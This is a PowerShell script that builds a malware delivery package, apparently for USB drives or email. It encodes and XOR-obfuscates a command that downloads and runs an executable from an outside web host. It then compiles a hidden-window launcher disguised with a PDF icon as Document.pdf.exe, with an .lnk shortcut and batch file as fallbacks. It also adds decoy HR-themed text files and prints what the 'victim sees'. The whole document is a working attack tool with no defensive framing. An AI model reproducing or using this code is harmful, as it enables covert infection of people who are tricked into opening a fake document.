param(
    [string]$Path = "",
    [switch]$Zip
)

$rawCmd = "`$wc=New-Object Net.WebClient;`$b=`$wc.DownloadData('https://allseeing.netlify.app/a');`$p=`$env:tmp+'\a.exe';[IO.File]::WriteAllBytes(`$p,`$b);start `$p;sleep -m 500;ri `$p -Force"
$encBytes = [System.Text.Encoding]::Unicode.GetBytes($rawCmd)
$encCmd = [Convert]::ToBase64String($encBytes)

# XOR-obfuscate the base64 command for the launcher binary (no null bytes in output)
$cmdBytes = [System.Text.Encoding]::UTF8.GetBytes($encCmd)
do {
    $xorKey = @()
    for ($i = 0; $i -lt 32; $i++) { $xorKey += (Get-Random -Min 0 -Max 256) }
    $xored = @()
    for ($i = 0; $i -lt $cmdBytes.Length; $i++) { $xored += $cmdBytes[$i] -bxor $xorKey[$i % 32] }
} while ($xored -contains 0)
$keyArr = ($xorKey | ForEach-Object { "0x{0:x2}" -f $_ }) -join ", "
$encArr = ($xored | ForEach-Object { "0x{0:x2}" -f $_ }) -join ", "

if (!$Path) {
    $Path = Read-Host "Enter target path (USB drive or folder)"
    if (!$Path) { Write-Error "No path provided"; exit 1 }
}

$Path = [IO.Path]::GetFullPath($Path)
if (!(Test-Path $Path)) { Write-Error "Path does not exist: $Path"; exit 1 }

Write-Output "Generating payload in: $Path"

# --- Extract PDF icon ---
$tmpDir = "$env:TEMP\ico_$(Get-Random)"
New-Item -ItemType Directory -Path $tmpDir -Force | Out-Null

$tempPdf = "$tmpDir\_.pdf"
Set-Content $tempPdf "%PDF-1.4" -Encoding Ascii

Add-Type -AssemblyName System.Drawing
$icon = [System.Drawing.Icon]::ExtractAssociatedIcon($tempPdf)
$icoPath = "$tmpDir\pdf.ico"
$fs = New-Object System.IO.FileStream($icoPath, [System.IO.FileMode]::Create)
$icon.Save($fs)
$fs.Close()
$icon.Dispose()
Remove-Item $tempPdf -Force
Write-Output "  [+] PDF icon extracted"

# --- Create launcher.rc ---
Set-Content "$tmpDir\launcher.rc" '101 ICON "pdf.ico"' -Encoding Ascii

# --- Create launcher.cpp ---
$cpp = '#include <windows.h>'
$cpp += "`r`nint WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {"
$cpp += "`r`n    unsigned char enc[] = { $encArr };"
$cpp += "`r`n    unsigned char key[] = { $keyArr };"
$cpp += "`r`n    char dec[sizeof(enc)+1] = {0};"
$cpp += "`r`n    for (int i = 0; i < (int)sizeof(enc); i++)"
$cpp += "`r`n        dec[i] = enc[i] ^ key[i % 32];"
$cpp += "`r`n    WinExec(dec, SW_HIDE);"
$cpp += "`r`n    return 0;"
$cpp += "`r`n}"
Set-Content "$tmpDir\launcher.cpp" $cpp -Encoding Ascii

# --- Compile ---
$oldPath = $env:Path
$env:Path = "C:\msys64\ucrt64\bin;" + $env:Path
$compile = windres "$tmpDir\launcher.rc" -O coff -o "$tmpDir\launcher.res" 2>&1
if ($LASTEXITCODE -eq 0) {
    g++ -static -Os -s -mwindows "$tmpDir\launcher.cpp" "$tmpDir\launcher.res" -o "$Path\Document.pdf.exe" 2>&1
    Remove-Item "$tmpDir\launcher.res" -Force
}
$env:Path = $oldPath

if ($LASTEXITCODE -ne 0) {
    Write-Error "Compilation failed - g++ may not be installed"
    $shell = New-Object -ComObject WScript.Shell
    $lnk = $shell.CreateShortcut("$Path\Document.pdf.lnk")
    $lnk.TargetPath = "powershell.exe"
    $lnk.Arguments = "-w h -Enc $encCmd"
    $lnk.WorkingDirectory = "%TEMP%"
    $lnk.WindowStyle = 7
    $lnk.IconLocation = "%SystemRoot%\system32\shell32.dll, 70"
    $lnk.Save()
    Write-Output "  [+] Document.pdf.lnk created (fallback)"
} else {
    Write-Output "  [+] Document.pdf.exe compiled"
}

# Clean up temp
Remove-Item "$tmpDir\launcher.cpp" -Force -ErrorAction SilentlyContinue
Remove-Item "$tmpDir\launcher.rc" -Force -ErrorAction SilentlyContinue
Remove-Item $icoPath -Force -ErrorAction SilentlyContinue
Remove-Item $tmpDir -Force -ErrorAction SilentlyContinue

# Run.bat (bypasses launcher issues)
Set-Content "$Path\Run.bat" "@echo off`r`npowershell -w h -Enc $encCmd" -Encoding ASCII
Write-Output "  [+] Run.bat created"

# Decoy Document.txt
Set-Content "$Path\Document.txt" "This document contains confidential information.`r`nFor authorized personnel only.`r`n`r`nPlease review and sign the attached agreement." -Encoding UTF8
Write-Output "  [+] Document.txt created"

# Decoy README.txt
Set-Content "$Path\README.txt" "Thank you for reviewing this document.`r`nPlease ensure all sections are completed`r`nbefore the deadline.`r`n`r`nIf you have any questions, contact the HR department." -Encoding UTF8
Write-Output "  [+] README.txt created"

# Optional zip
if ($Zip) {
    $zipFiles = @()
    foreach ($f in @("Document.pdf.exe", "Document.pdf.lnk", "Document.txt", "README.txt")) {
        $fp = "$Path\$f"
        if (Test-Path $fp) { $zipFiles += $fp }
    }
    $zipPath = "$Path\Document.zip"
    if (Test-Path $zipPath) { Remove-Item $zipPath -Force }
    if ($zipFiles.Count -gt 0) {
        Compress-Archive -Path $zipFiles -DestinationPath $zipPath -CompressionLevel Optimal
        Write-Output "  [+] Document.zip created"
    }
}

Write-Output ""
Write-Output "=== DELIVERY SUMMARY ==="
Write-Output "Folder: $Path"
if (Test-Path "$Path\Document.pdf.exe") {
    Write-Output "Payload: Document.pdf.exe (no arrow, real PDF icon)"
    Write-Output "Victim sees: Document.pdf (clicks it -> payload fires)"
} elseif (Test-Path "$Path\Document.pdf.lnk") {
    Write-Output "Payload: Document.pdf.lnk (PDF icon, has shortcut arrow)"
    Write-Output "Victim sees: Document.pdf (shortcut)"
}
if ($Zip -and (Test-Path "$Path\Document.zip")) { Write-Output "Zipped: Document.zip" }
Write-Output "=========================="